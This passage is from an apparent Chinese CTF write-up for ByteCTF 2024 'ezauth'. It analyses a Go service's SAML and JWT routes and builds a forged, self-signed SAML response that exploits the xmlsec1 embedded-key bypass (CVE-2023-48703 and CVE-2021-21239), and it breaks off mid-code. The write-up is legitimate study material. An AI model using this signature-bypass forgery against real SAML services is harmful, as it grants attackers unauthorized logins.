<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/golang/go1.20.1.linux-amd64.tar.gz  ; tar -zxvf go1.20.1.linux-amd64.tar.gz;</span><br></pre></td></tr></table></figure>

<p>goland配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GOPROXY=https://goproxy.io,direct;GOPRIVATE=git.mycompany.com,github.com/my/private</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装xmlsec1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install xmlsec1</span><br></pre></td></tr></table></figure>



<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="SAML-术语"><a href="#SAML-术语" class="headerlink" title="SAML 术语"></a><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?spm=a2c6h.12873639.article-detail.27.2515f538c7f477&__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect">SAML 术语</a></h2><ul>
<li>IdP——身份提供者</li>
<li>SP - 服务提供商</li>
<li>用户——使用系统访问服务提供商服务的用户</li>
</ul>
<p>典型的 SAML 工作流由 IdP、SP 和用户组成。用户信息作为断言发送。让我们假设用户有一个 Idp 帐户并拥有有效的凭据</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect"><img src="/../imgs/$%7Bfiilename%7D/465szxgyid2bk_47a20632ef4e42d9bdda8d05666eafdc.png" alt="image"></a></p>
<p>让我们将上图分解为多个步骤，以便于理解</p>
<ol>
<li>用户转到服务提供商并单击 SAML 登录</li>
<li>SP 将请求重定向到身份提供者</li>
<li>身份提供者向用户显示登录页面以输入凭据</li>
<li>输入凭据后，SAML IdP 会验证其 Active Directory 或数据库中的凭据</li>
<li>验证后，SAML 响应会以 XML 格式发送带有断言，如上所示</li>
<li>然后用户将登录到应用程序</li>
</ol>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>看路由</p>
<h2 id="acs"><a href="#acs" class="headerlink" title="&#x2F;acs"></a>&#x2F;acs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">    // 配置SAML服务提供商的设置</span><br><span class="line">    sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">        PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">        PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">        IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">        IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">        IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">        SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">        AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">    &#125;</span><br><span class="line">    sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">    // 从POST表单中获取SAML响应</span><br><span class="line">    encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">    if encodedXML == &quot;&quot; &#123;</span><br><span class="line">        // 如果SAML响应为空，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 解析SAML响应</span><br><span class="line">    response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果解析失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 验证SAML响应</span><br><span class="line">    err = response.Validate(&amp;sp)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果验证失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取SAML响应中的用户标识符uid</span><br><span class="line">    samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">    if samlID == &quot;&quot; &#123;</span><br><span class="line">        // 如果uid缺失，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义JWT声明，设置过期时间为7天</span><br><span class="line">    claims := MyCustomClaims&#123;</span><br><span class="line">        jwt.StandardClaims&#123;</span><br><span class="line">            ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">            Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;guest&quot;, // 用户名</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用HS256签名方法生成JWT令牌</span><br><span class="line">    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">    tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">    // 返回生成的JWT令牌和随机验证码</span><br><span class="line">    c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">        &quot;token&quot;: tokenString,</span><br><span class="line">        &quot;code&quot;:  random_code,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>这块代码初始化SAML服务提供商，解析IDP-&gt;SP返回包以获取用户是否通过认证。通过认证则下发jwt。</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 定义受JWT认证保护的路由组</span><br><span class="line">auth := r.Group(&quot;/&quot;)</span><br><span class="line">auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">&#123;</span><br><span class="line">    // 受保护的/admin路由</span><br><span class="line">    auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">        code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">        if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">            // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">            flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">            c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则返回未授权的错误</span><br><span class="line">            c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过jwt认证 可以获取flag</p>
<h2 id="jwt认证中间件"><a href="#jwt认证中间件" class="headerlink" title="jwt认证中间件"></a>jwt认证中间件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看完整段代码  初步逻辑是伪造IDP-&gt;SP消息，通过认证生成jwt</p>
<h2 id="如何伪造idp-sp-？"><a href="#如何伪造idp-sp-？" class="headerlink" title="如何伪造idp-&gt;sp ？"></a>如何伪造idp-&gt;sp ？</h2><p>正常的流程是 sp收到idp的响应后，用idp的公钥对消息进行签名。</p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p>xmlsec1的漏洞，还有一个<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p>问题来源于 xmlsec1在验证签名1.xml时，如果1.xml里面有公钥信息，会选用1.xml里携带的公钥进行验证。</p>
<p>让我们用go-saml项目示例的代码 学习一下流程</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<h3 id="两对密钥"><a href="#两对密钥" class="headerlink" title="两对密钥"></a>两对密钥</h3><p>idp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/frntn/x509-san/master/gencert.sh | CRT_CN=&quot;mycert&quot;  bash</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.crt</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用默认的，我的路径为</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.crt</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.key</span><br></pre></td></tr></table></figure>

<p>证书(Certificate) - *.cer *.crt<br>私钥(Private Key) - *.key</p>
<p>至于pem和der，是编码方式</p>
<p>*.pem - base64编码</p>
<p>*.der - 二进制编码</p>
<h3 id="idp"><a href="#idp" class="headerlink" title="idp"></a>idp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">issuer := &quot;http://localhost:8000/saml&quot;</span><br><span class="line">authnResponse := saml.NewSignedResponse()</span><br><span class="line">authnResponse.Issuer.Url = issuer</span><br><span class="line">authnResponse.Assertion.Issuer.Url = issuer</span><br><span class="line">authnResponse.Signature.KeyInfo.X509Data.X509Certificate.Cert = &quot;stringValueOfCert&quot;</span><br><span class="line">authnResponse.Assertion.Subject.NameID.Value = &quot;userIdThatYouAuthenticated&quot;</span><br><span class="line">authnResponse.AddAttribute(&quot;uid&quot;, &quot;userIdThatYouAuthenticated&quot;)</span><br><span class="line">authnResponse.AddAttribute(&quot;email&quot;, &quot;someone@domain&quot;)</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.Recipient = issuer</span><br><span class="line"></span><br><span class="line">// or signed base64 encoded XML string</span><br><span class="line">b64XML, err := authnResponse.EncodedSignedString(&quot;/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key&quot;)</span><br><span class="line">b64XML = &quot;SAMLResponse=&quot; + b64XML</span><br><span class="line">// 创建一个POST请求，目标地址是localhost:58080/acs</span><br><span class="line">_, err = http.Post(&quot;http://localhost:58080/acs&quot;, &quot;application/x-www-form-urlencoded&quot;, bytes.NewBufferString(b64XML))</span><br></pre></td></tr></table></figure>

<h3 id="sp"><a href="#sp" class="headerlink" title="sp"></a>sp</h3><p>用题目的</p>
<h3 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : /tmp/tmpgs1448165946:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">/tmp/tmpgs1448165946:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecK</span><br></pre></td></tr></table></figure>

<p>存在一些空属性没有赋值，我们看一下NewSignedResponse() 方法，该方法返回的是一个名为 <code>Response</code> 的结构体实例。</p>
<p>示例给的idp代码中的赋值操作，实际上对这个结构体进行修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">func NewSignedResponse() *Response &#123;</span><br><span class="line">	return &amp;Response&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlp:Response&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		SAMLP:        &quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;,</span><br><span class="line">		SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">		SAMLSIG:      &quot;http://www.w3.org/2000/09/xmldsig#&quot;,</span><br><span class="line">		ID:           util.ID(),</span><br><span class="line">		Version:      &quot;2.0&quot;,</span><br><span class="line">		IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">		Issuer: Issuer&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Issuer&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">		&#125;,</span><br><span class="line">		Signature: Signature&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:Signature&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Id: util.ID(),</span><br><span class="line">			SignedInfo: SignedInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignedInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				CanonicalizationMethod: CanonicalizationMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:CanonicalizationMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SignatureMethod: SignatureMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:SignatureMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SamlsigReference: SamlsigReference&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:Reference&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					URI: &quot;&quot;, // caller must populate &quot;#&quot; + ar.Id,</span><br><span class="line">					Transforms: Transforms&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:Transforms&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Transform: []Transform&#123;Transform&#123;</span><br><span class="line">							XMLName: xml.Name&#123;</span><br><span class="line">								Local: &quot;samlsig:Transform&quot;,</span><br><span class="line">							&#125;,</span><br><span class="line">							Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;,</span><br><span class="line">						&#125;&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestMethod: DigestMethod&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestMethod&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestValue: DigestValue&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestValue&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			SignatureValue: SignatureValue&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignatureValue&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			KeyInfo: KeyInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				X509Data: X509Data&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					X509Certificate: X509Certificate&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Status: Status&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlp:Status&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			StatusCode: StatusCode&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlp:StatusCode&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				// TODO unsuccesful responses??</span><br><span class="line">				Value: &quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;,</span><br><span class="line">			